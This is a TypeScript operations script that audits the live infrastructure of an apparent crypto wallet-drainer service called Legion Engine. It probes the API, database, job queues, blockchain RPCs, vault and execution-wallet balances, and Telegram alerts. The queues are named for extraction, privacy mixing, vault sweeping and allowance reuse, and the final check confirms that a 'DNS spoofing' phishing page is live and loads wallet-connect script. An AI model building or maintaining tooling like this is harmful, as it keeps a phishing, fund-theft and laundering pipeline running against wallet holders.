/**
 * Live runtime audit — read-only probes against deployed/local Legion API + dependencies.
 *
 * Run from repo root:
 *   pnpm run live-audit
 *   pnpm exec tsx --env-file=.env scripts/live-audit.ts
 *
 * Safe: no drains, no settlement, no queue job enqueue.
 */
import {
  fetchTonBalance,
  fetchTronBalance,
  fetchVaultGasBalances,
  getRpcUrlForChainWithFallback,
  resolveServerBitcoinAddress,
  resolveServerSolanaPublicKey,
  resolveServerTronAddressAsync,
  resolveSettlementExecutorKey,
} from '@legion/core'
import { fetchBtcBalanceFromMesh } from '@legion/core/scout/rpc-mesh'
import { Connection, PublicKey } from '@solana/web3.js'
import { Queue } from 'bullmq'
import IoRedis from 'ioredis'
import pg from 'pg'
import { createPublicClient, formatEther, http } from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { mainnet } from 'viem/chains'

type Status = 'pass' | 'warn' | 'fail' | 'skip'

type AuditRow = {
  check: string
  status: Status
  details: string
}

const rows: AuditRow[] = []
const issues: string[] = []

const QUEUE_NAMES = ['extraction', 'privacy-mixing', 'vault-sweep', 'allowance-reuse'] as const
const DLQ_TTL_MS = 7 * 24 * 60 * 60 * 1000
const DEPTH_ALERT = 100

function env(key: string): string {
  return process.env[key]?.trim() ?? ''
}

function statusIcon(s: Status): string {
  if (s === 'pass') return '✅'
  if (s === 'warn') return '⚠️'
  if (s === 'fail') return '❌'
  return '—'
}

function record(check: string, status: Status, details: string): void {
  rows.push({ check, status, details })
  if (status === 'fail') issues.push(`${check}: ${details}`)
  if (status === 'warn') issues.push(`[warn] ${check}: ${details}`)
}

async function withLatency<T>(fn: () => Promise<T>): Promise<{ value: T; ms: number }> {
  const t0 = Date.now()
  const value = await fn()
  return { value, ms: Date.now() - t0 }
}

function resolveApiBaseUrl(): string {
  return (
    env('RAILWAY_PUBLIC_URL') ||
    env('API_SITE_URL') ||
    env('NEXT_PUBLIC_LEGION_ENGINE_API_URL') ||
    `http://localhost:${env('PORT') || '4000'}`
  ).replace(/\/+$/, '')
}

function resolveUtxoEndpoints(): string[] {
  const raw = env('UTXO_BROADCAST_ENDPOINTS')
  if (raw) {
    return raw.split(',').map((s) => s.trim()).filter(Boolean)
  }
  return ['https://mempool.space/api']
}

function resolveTelegramChatIds(): string[] {
  const multi = env('TELEGRAM_CHAT_IDS')
  if (multi) {
    return multi
      .split(',')
      .map((s) => s.trim())
      .filter(Boolean)
  }
  const single = env('TELEGRAM_CHAT_ID')
  return single ? [single] : []
}

// ── 1. Deployment health ────────────────────────────────────────────────────

async function checkDeploymentHealth(): Promise<void> {
  const base = resolveApiBaseUrl()
  try {
    const { value: res, ms } = await withLatency(() =>
      fetch(`${base}/health`, { signal: AbortSignal.timeout(20_000) }),
    )
    if (!res.ok) {
      const hint =
        res.status === 404 && !env('RAILWAY_PUBLIC_URL')
          ? ' — set RAILWAY_PUBLIC_URL to your Railway API host (not the frontend URL)'
          : ''
      record('Deployment health', 'fail', `HTTP ${res.status} (${ms}ms) — ${base}/health${hint}`)
      return
    }
    const json = (await res.json()) as {
      success?: boolean
      data?: { status?: string }
    }
    if (json.success === true && json.data?.status === 'ok') {
      record('Deployment health', 'pass', `HTTP ${res.status}, data.status=ok (${ms}ms) — ${base}`)
    } else {
      record(
        'Deployment health',
        'fail',
        `Unexpected body: ${JSON.stringify(json).slice(0, 180)} (${ms}ms)`,
      )
    }
  } catch (e) {
    record('Deployment health', 'fail', e instanceof Error ? e.message : String(e))
  }
}

// ── 2. Database ─────────────────────────────────────────────────────────────

async function checkDatabase(): Promise<void> {
  const databaseUrl = env('DATABASE_URL')
  if (!databaseUrl) {
    record('Database', 'skip', 'DATABASE_URL not configured')
    return
  }

  const pool = new pg.Pool({
    connectionString: databaseUrl,
    max: 1,
    connectionTimeoutMillis: 20_000,
    ssl: databaseUrl.includes('supabase') ? { rejectUnauthorized: false } : undefined,
  })

  try {
    const { ms: pingMs } = await withLatency(async () => {
      const r = await pool.query('SELECT 1 AS one')
      if (r.rows[0]?.one !== 1) throw new Error('SELECT 1 unexpected result')
    })

    const { value: tableRes, ms: tableMs } = await withLatency(() =>
      pool.query(
        `SELECT EXISTS (
           SELECT FROM information_schema.tables
           WHERE table_schema = 'public' AND table_name = 'asset_scans'
         ) AS exists`,
      ),
    )
    const exists = tableRes.rows[0]?.exists === true
    if (!exists) {
      record(
        'Database',
        'warn',
        `SELECT 1 OK (${pingMs}ms); asset_scans missing — run scripts/migrations/001_asset_scans.sql`,
      )
      return
    }
    const countRes = await pool.query('SELECT COUNT(*)::int AS n FROM asset_scans')
    const n = countRes.rows[0]?.n ?? 0
    record('Database', 'pass', `SELECT 1 (${pingMs}ms); asset_scans exists, ${n} rows (${tableMs}ms)`)
  } catch (e) {
    record('Database', 'fail', e instanceof Error ? e.message : String(e))
  } finally {
    await pool.end().catch(() => {})
  }
}

// ── 3. Redis + BullMQ ─────────────────────────────────────────────────────────

async function checkRedisAndQueues(): Promise<void> {
  const redisUrl = env('REDIS_URL')
  if (!redisUrl) {
    record('Redis', 'fail', 'REDIS_URL not configured')
    return
  }

  const redis = new IoRedis(redisUrl, { maxRetriesPerRequest: null, connectTimeout: 15_000 })

  try {
    const { value: pong, ms } = await withLatency(() => redis.ping())
    record('Redis', pong === 'PONG' ? 'pass' : 'warn', `${pong} (${ms}ms)`)

    const queueParts: string[] = []
    for (const name of QUEUE_NAMES) {
      const connection = new IoRedis(redisUrl, { maxRetriesPerRequest: null })
      try {
        const queue = new Queue(name, { connection: connection as never })
        const counts = await queue.getJobCounts('waiting', 'active', 'delayed', 'failed')
        await queue.close()
        queueParts.push(
          `${name}: w=${counts.waiting ?? 0} a=${counts.active ?? 0} d=${counts.delayed ?? 0} f=${counts.failed ?? 0}`,
        )
      } catch (e) {
        queueParts.push(`${name}: ${e instanceof Error ? e.message : String(e)}`)
      } finally {
        connection.disconnect()
      }
    }
    record('BullMQ queues', 'pass', queueParts.join(' | '))
  } catch (e) {
    record('Redis', 'fail', e instanceof Error ? e.message : String(e))
  } finally {
    redis.disconnect()
  }
}

// ── 4. RPC probes ───────────────────────────────────────────────────────────

async function jsonRpcPost(
  url: string,
  body: unknown,
  headers?: Record<string, string>,
): Promise<{ ok: boolean; detail: string; ms: number }> {
  const { value: res, ms } = await withLatency(() =>
    fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', ...headers },
      body: JSON.stringify(body),
      signal: AbortSignal.timeout(15_000),
    }),
  )
  if (!res.ok) return { ok: false, detail: `HTTP ${res.status}`, ms }
  const json = (await res.json()) as { result?: unknown; error?: { message?: string } }
  if (json.error) return { ok: false, detail: json.error.message ?? 'RPC error', ms }
  return { ok: true, detail: String(json.result ?? 'ok'), ms }
}

async function checkRpcEthereum(): Promise<void> {
  const rpc = env('RPC_ETHEREUM_PRIVATE') || env('RPC_URL') || env('NEXT_PUBLIC_RPC_URL')
  if (!rpc) {
    record('RPC Ethereum', 'skip', 'RPC_ETHEREUM_PRIVATE not configured')
    return
  }
  const r = await jsonRpcPost(rpc, {
    jsonrpc: '2.0',
    id: 1,
    method: 'eth_blockNumber',
    params: [],
  })
  record('RPC Ethereum', r.ok ? 'pass' : 'fail', r.ok ? `block=${r.detail} (${r.ms}ms)` : r.detail)
}

async function checkRpcSolana(): Promise<void> {
  const rpc =
    env('RPC_SOLANA_PRIVATE') || env('SOLANA_RPC_URL') || env('NEXT_PUBLIC_SOLANA_RPC_URL')
  if (!rpc) {
    record('RPC Solana', 'skip', 'RPC_SOLANA_PRIVATE not configured')
    return
  }
  const r = await jsonRpcPost(rpc, { jsonrpc: '2.0', id: 1, method: 'getHealth', params: [] })
  record('RPC Solana', r.ok ? 'pass' : 'fail', r.ok ? `health=${r.detail} (${r.ms}ms)` : r.detail)
}

async function checkRpcTron(): Promise<void> {
  const base = (env('TRON_FULL_NODE_URL') || 'https://api.trongrid.io').replace(/\/+$/, '')
  const apiKey = env('TRON_PRO_API_KEY')
  try {
    const { value: res, ms } = await withLatency(() =>
      fetch(`${base}/wallet/getnowblock`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...(apiKey ? { 'TRON-PRO-API-KEY': apiKey } : {}),
        },
        body: '{}',
        signal: AbortSignal.timeout(15_000),
      }),
    )
    record(
      'RPC Tron',
      res.ok ? 'pass' : 'fail',
      res.ok ? `getnowblock HTTP ${res.status} (${ms}ms)` : `HTTP ${res.status}`,
    )
  } catch (e) {
    record('RPC Tron', 'fail', e instanceof Error ? e.message : String(e))
  }
}

async function checkRpcTon(): Promise<void> {
  const url = env('TON_JSON_RPC_URL') || 'https://toncenter.com/api/v2/jsonRPC'
  const apiKey = env('TONCENTER_API_KEY')
  const headers = apiKey ? { 'X-API-Key': apiKey } : undefined
  const r = await jsonRpcPost(
    url,
    { jsonrpc: '2.0', id: 1, method: 'getMasterchainInfo', params: [] },
    headers,
  )
  record('RPC TON', r.ok ? 'pass' : 'fail', r.ok ? `masterchain OK (${r.ms}ms)` : r.detail)
}

async function checkRpcBitcoin(): Promise<void> {
  const token = env('BLOCKCYPHER_API_TOKEN')
  if (token) {
    const base = env('BLOCKCYPHER_BASE_URL') || 'https://api.blockcypher.com/v1'
    try {
      const { value: res, ms } = await withLatency(() =>
        fetch(`${base.replace(/\/+$/, '')}/btc/main?token=${encodeURIComponent(token)}`, {
          signal: AbortSignal.timeout(15_000),
        }),
      )
      if (res.ok) {
        record('RPC Bitcoin', 'pass', `BlockCypher OK (${ms}ms)`)
        return
      }
    } catch {
      /* fall through */
    }
  }
  const endpoint =
    env('UTXO_BROADCAST_ENDPOINTS')?.split(',')[0]?.trim().replace(/\/+$/, '') ||
    'https://mempool.space/api'
  try {
    const { value: res, ms } = await withLatency(() =>
      fetch(`${endpoint}/blocks/tip/height`, { signal: AbortSignal.timeout(15_000) }),
    )
    if (!res.ok) {
      record('RPC Bitcoin', 'fail', `HTTP ${res.status}`)
      return
    }
    const height = (await res.text()).trim()
    record('RPC Bitcoin', 'pass', `tip height=${height} (${ms}ms) via ${endpoint}`)
  } catch (e) {
    record('RPC Bitcoin', 'fail', e instanceof Error ? e.message : String(e))
  }
}

// ── 5. Vault gas ──────────────────────────────────────────────────────────────

async function checkVaultGas(): Promise<void> {
  const minNative = Number.parseFloat(env('GAS_VAULT_MIN_NATIVE') || '0.01')
  try {
    const gasRows = await fetchVaultGasBalances()
    if (gasRows.length === 0) {
      record('Vault gas (all)', 'warn', 'No sovereign vault addresses configured')
      return
    }
    for (const row of gasRows) {
      const label = `Vault gas – ${row.chain}`
      if (row.error) {
        record(label, 'fail', row.error)
      } else if (row.native_amount < minNative) {
        record(label, 'warn', `${row.native_display} < min ${minNative}`)
      } else {
        record(label, 'pass', `${row.native_display} (≥ ${minNative})`)
      }
    }
  } catch (e) {
    record('Vault gas (all)', 'fail', e instanceof Error ? e.message : String(e))
  }
}

// ── 6. Execution wallet balances ────────────────────────────────────────────

async function checkExecutionWallets(): Promise<void> {
  const minExec = Number.parseFloat(env('LIVE_AUDIT_EXEC_MIN_NATIVE') || '0.005')

  const evmKey = resolveSettlementExecutorKey()
  if (evmKey) {
    try {
      const account = privateKeyToAccount(evmKey)
      const rpc = getRpcUrlForChainWithFallback(1)
      const client = createPublicClient({ chain: mainnet, transport: http(rpc) })
      const { value: wei, ms } = await withLatency(() => client.getBalance({ address: account.address }))
      const eth = Number(formatEther(wei))
      record(
        'Execution wallet – EVM',
        eth < minExec ? 'warn' : 'pass',
        `${eth.toFixed(6)} ETH (${ms}ms)`,
      )
    } catch (e) {
      record('Execution wallet – EVM', 'fail', e instanceof Error ? e.message : String(e))
    }
  } else {
    record('Execution wallet – EVM', 'skip', 'SETTLEMENT_EXECUTION_PRIVATE_KEY not set')
  }

  const solAddr = resolveServerSolanaPublicKey()
  if (solAddr) {
    try {
      const rpc =
        env('RPC_SOLANA_PRIVATE') || env('SOLANA_RPC_URL') || 'https://api.mainnet-beta.solana.com'
      const conn = new Connection(rpc, 'confirmed')
      const { value: lamports, ms } = await withLatency(() => conn.getBalance(new PublicKey(solAddr)))
      const sol = lamports / 1e9
      record(
        'Execution wallet – Solana',
        sol < minExec ? 'warn' : 'pass',
        `${sol.toFixed(6)} SOL (${ms}ms)`,
      )
    } catch (e) {
      record('Execution wallet – Solana', 'fail', e instanceof Error ? e.message : String(e))
    }
  } else {
    record('Execution wallet – Solana', 'skip', 'SETTLEMENT_EXECUTION_SOLANA_SECRET_KEY not set')
  }

  const tronAddr = await resolveServerTronAddressAsync()
  if (tronAddr) {
    try {
      const { value: sun, ms } = await withLatency(() => fetchTronBalance(tronAddr))
      const trx = Number(sun) / 1e6
      record(
        'Execution wallet – Tron',
        trx < minExec ? 'warn' : 'pass',
        `${trx.toFixed(4)} TRX (${ms}ms)`,
      )
    } catch (e) {
      record('Execution wallet – Tron', 'fail', e instanceof Error ? e.message : String(e))
    }
  } else {
    record('Execution wallet – Tron', 'skip', 'TRON_EXECUTION_PRIVATE_KEY not set')
  }

  if (env('TON_EXECUTION_MNEMONIC')) {
    try {
      const { value: nano, ms } = await withLatency(() => fetchTonBalance())
      const ton = Number(nano) / 1e9
      record(
        'Execution wallet – TON',
        ton < minExec ? 'warn' : 'pass',
        `${ton.toFixed(4)} TON (${ms}ms)`,
      )
    } catch (e) {
      record('Execution wallet – TON', 'fail', e instanceof Error ? e.message : String(e))
    }
  } else {
    record('Execution wallet – TON', 'skip', 'TON_EXECUTION_MNEMONIC not set')
  }

  const btcAddr = resolveServerBitcoinAddress()
  if (btcAddr) {
    try {
      const endpoints = resolveUtxoEndpoints()
      const { value: sats, ms } = await withLatency(() =>
        fetchBtcBalanceFromMesh(btcAddr, endpoints),
      )
      const btc = Number(sats) / 1e8
      record(
        'Execution wallet – Bitcoin',
        btc < minExec ? 'warn' : 'pass',
        `${btc.toFixed(8)} BTC (${ms}ms)`,
      )
    } catch (e) {
      record('Execution wallet – Bitcoin', 'fail', e instanceof Error ? e.message : String(e))
    }
  } else {
    record('Execution wallet – Bitcoin', 'skip', 'BITCOIN_EXECUTION_WIF not set')
  }
}

// ── 7. Telegram ─────────────────────────────────────────────────────────────

async function checkTelegram(): Promise<void> {
  const token = env('TELEGRAM_BOT_TOKEN')
  const chatIds = resolveTelegramChatIds()
  if (!token || chatIds.length === 0) {
    record('Telegram bot', 'skip', 'TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_IDS not configured')
    return
  }

  const text = `🟢 Live audit - connectivity test\n${new Date().toISOString()}\n(No settlement action taken.)`
  const url = `https://api.telegram.org/bot${token}/sendMessage`
  let sent = 0
  const errors: string[] = []

  for (const chatId of chatIds) {
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text }),
        signal: AbortSignal.timeout(15_000),
      })
      const json = (await res.json()) as { ok?: boolean; description?: string }
      if (json.ok) sent++
      else errors.push(`${chatId}: ${json.description ?? res.status}`)
    } catch (e) {
      errors.push(`${chatId}: ${e instanceof Error ? e.message : String(e)}`)
    }
  }

  if (sent === chatIds.length) {
    record('Telegram bot', 'pass', `Test message sent to ${sent} chat(s)`)
  } else if (sent > 0) {
    record('Telegram bot', 'warn', `Partial ${sent}/${chatIds.length}: ${errors.join('; ')}`)
  } else {
    record('Telegram bot', 'fail', errors.join('; ') || 'send failed')
  }
}

// ── 8. Sentinel runtime (simulated) ─────────────────────────────────────────

async function checkSentinelSimulated(): Promise<void> {
  const enabled =
    env('SENTINEL_RUNTIME_ENABLED').toLowerCase() === 'true' ||
    env('SENTINEL_RUNTIME_ENABLED') === '1'
  if (!enabled) {
    record('Sentinel runtime', 'skip', 'SENTINEL_RUNTIME_ENABLED=false')
    return
  }

  const simIssues: string[] = []
  const redisUrl = env('REDIS_URL')

  if (redisUrl) {
    const r = new IoRedis(redisUrl, { maxRetriesPerRequest: 1, connectTimeout: 8_000 })
    try {
      if ((await r.ping()) !== 'PONG') simIssues.push('Redis unreachable')
    } catch {
      simIssues.push('Redis unreachable')
    } finally {
      r.disconnect()
    }
  } else {
    simIssues.push('Redis URL unset')
  }

  const ethRpc = env('RPC_ETHEREUM_PRIVATE') || env('NEXT_PUBLIC_RPC_URL')
  if (ethRpc) {
    const r = await jsonRpcPost(ethRpc, {
      jsonrpc: '2.0',
      id: 1,
      method: 'eth_blockNumber',
      params: [],
    })
    if (!r.ok) simIssues.push('EVM RPC probe failed')
  }

  if (redisUrl) {
    for (const name of QUEUE_NAMES) {
      const connection = new IoRedis(redisUrl, { maxRetriesPerRequest: null })
      try {
        const queue = new Queue(name, { connection: connection as never })
        const counts = await queue.getJobCounts('waiting', 'active', 'delayed')
        await queue.close()
        const depth = (counts.waiting ?? 0) + (counts.active ?? 0) + (counts.delayed ?? 0)
        if (depth > DEPTH_ALERT) simIssues.push(`Queue ${name} depth ${depth}`)
      } catch {
        simIssues.push(`Queue ${name} unreadable`)
      } finally {
        connection.disconnect()
      }
    }
  }

  try {
    const minNative = Number.parseFloat(env('GAS_VAULT_MIN_NATIVE') || '0.01')
    for (const row of await fetchVaultGasBalances()) {
      if (!row.error && row.native_amount < minNative) {
        simIssues.push(`${row.chain} vault gas low`)
      }
    }
  } catch {
    simIssues.push('Vault gas probe failed')
  }

  const tgConfigured = Boolean(env('TELEGRAM_BOT_TOKEN') && resolveTelegramChatIds().length > 0)
  if (simIssues.length === 0) {
    record('Sentinel runtime', 'pass', 'Simulated run: all probes OK; no Telegram alert would fire')
  } else {
    record(
      'Sentinel runtime',
      'warn',
      `${simIssues.length} issue(s): ${simIssues.join('; ')}` +
        (tgConfigured ? ' — alert WOULD be sent' : ' — Telegram not configured'),
    )
  }
}

// ── 9. DLQ ──────────────────────────────────────────────────────────────────

async function checkDlq(): Promise<void> {
  const redisUrl = env('REDIS_URL')
  if (!redisUrl) {
    record('DLQ', 'skip', 'REDIS_URL not configured')
    return
  }

  const redis = new IoRedis(redisUrl, { maxRetriesPerRequest: null })
  const now = Date.now()
  const cutoff = now - DLQ_TTL_MS
  const allEntries: Array<{ queue: string; ageHours: number; error: string }> = []
  let staleCount = 0

  try {
    for (const queueName of QUEUE_NAMES) {
      const zkey = `legion:dlq:${queueName}:zset`
      const recent = await redis.zrevrangebyscore(zkey, '+inf', cutoff, 'LIMIT', 0, 10)
      for (const line of recent) {
        try {
          const parsed = JSON.parse(line) as { queue?: string; failed_at?: string; error?: string }
          const failedAt = parsed.failed_at ? Date.parse(parsed.failed_at) : now
          allEntries.push({
            queue: parsed.queue ?? queueName,
            ageHours: (now - failedAt) / 3_600_000,
            error: (parsed.error ?? '').slice(0, 60),
          })
        } catch {
          /* skip malformed */
        }
      }
      const stale = await redis.zrangebyscore(zkey, '-inf', cutoff, 'LIMIT', 0, 20)
      staleCount += stale.length
    }

    const top5 = allEntries
      .sort((a, b) => a.ageHours - b.ageHours)
      .reverse()
      .slice(0, 5)

    if (staleCount > 0) {
      record(
        'DLQ',
        'warn',
        `${allEntries.length} entries (7d window); ${staleCount} stale (>7d) still in Redis`,
      )
    } else if (allEntries.length === 0) {
      record('DLQ', 'pass', 'No failed jobs in DLQ (last 7 days)')
    } else {
      const summary = top5.map((e) => `${e.queue} ${e.ageHours.toFixed(1)}h`).join('; ')
      const last5Detail = top5
        .map((e) => `${e.queue}: ${e.error || 'n/a'}`)
        .join(' | ')
      record(
        'DLQ',
        'warn',
        `${allEntries.length} entries; recent: ${summary}. Last errors: ${last5Detail}`,
      )
    }
  } catch (e) {
    record('DLQ', 'fail', e instanceof Error ? e.message : String(e))
  } finally {
    redis.disconnect()
  }
}

// ── 10. DNS spoofing page ─────────────────────────────────────────────────────

async function checkPhishingPage(): Promise<void> {
  const trainingOn =
    env('PHISHING_TRAINING_MODE').toLowerCase() === 'true' ||
    env('PHISHING_TRAINING_MODE') === '1'
  const pageUrl = env('PHISHING_PAGE_URL')

  if (trainingOn) {
    record('DNS spoofing page', 'skip', 'PHISHING_TRAINING_MODE=true')
    return
  }
  if (!pageUrl) {
    record('DNS spoofing page', 'skip', 'PHISHING_PAGE_URL not set')
    return
  }

  try {
    const { value: res, ms } = await withLatency(() =>
      fetch(pageUrl, { signal: AbortSignal.timeout(20_000), redirect: 'follow' }),
    )
    if (!res.ok) {
      record('DNS spoofing page', 'fail', `HTTP ${res.status} (${ms}ms)`)
      return
    }
    const html = await res.text()
    const hasWalletHint = /walletconnect|reown|appkit|ethereum|connect.*wallet/i.test(html)
    record(
      'DNS spoofing page',
      hasWalletHint ? 'pass' : 'warn',
      `HTTP ${res.status} (${ms}ms); wallet/script hints: ${hasWalletHint ? 'found' : 'not detected'}`,
    )
  } catch (e) {
    record('DNS spoofing page', 'fail', e instanceof Error ? e.message : String(e))
  }
}

// ── Output ────────────────────────────────────────────────────────────────────

function printTable(): void {
  console.log('')
  console.log('Legion Engine — Live Runtime Audit')
  console.log(`API base: ${resolveApiBaseUrl()}`)
  console.log(`Time: ${new Date().toISOString()}`)
  console.log('')
  console.log('| Check | Status | Details |')
  console.log('|-------|--------|---------|')
  for (const row of rows) {
    const details = row.details.replace(/\|/g, '\\|').replace(/\n/g, ' ')
    console.log(`| ${row.check} | ${statusIcon(row.status)} | ${details} |`)
  }
  console.log('')
}

function printVerdict(): void {
  const fails = rows.filter((r) => r.status === 'fail').length
  const warns = rows.filter((r) => r.status === 'warn').length

  let verdict: 'READY' | 'PARTIAL' | 'NOT READY'
  if (fails > 0) verdict = 'NOT READY'
  else if (warns > 0) verdict = 'PARTIAL'
  else verdict = 'READY'

  console.log('────────────────────────────────────────')
  console.log(`Final verdict: ${verdict}`)
  console.log(`  Pass: ${rows.filter((r) => r.status === 'pass').length}`)
  console.log(`  Warn: ${warns}`)
  console.log(`  Fail: ${fails}`)
  console.log(`  Skip: ${rows.filter((r) => r.status === 'skip').length}`)

  if (issues.length > 0) {
    console.log('')
    console.log('Issues to address:')
    for (const i of [...new Set(issues)].slice(0, 30)) {
      console.log(`  • ${i}`)
    }
  }
  console.log('')
}

async function main(): Promise<void> {
  await checkDeploymentHealth()
  await checkDatabase()
  await checkRedisAndQueues()
  await checkRpcEthereum()
  await checkRpcSolana()
  await checkRpcTron()
  await checkRpcTon()
  await checkRpcBitcoin()
  await checkVaultGas()
  await checkExecutionWallets()
  await checkTelegram()
  await checkSentinelSimulated()
  await checkDlq()
  await checkPhishingPage()

  printTable()
  printVerdict()

  process.exit(rows.some((r) => r.status === 'fail') ? 1 : 0)
}

void main().catch((e) => {
  console.error('Live audit crashed:', e)
  process.exit(1)
})
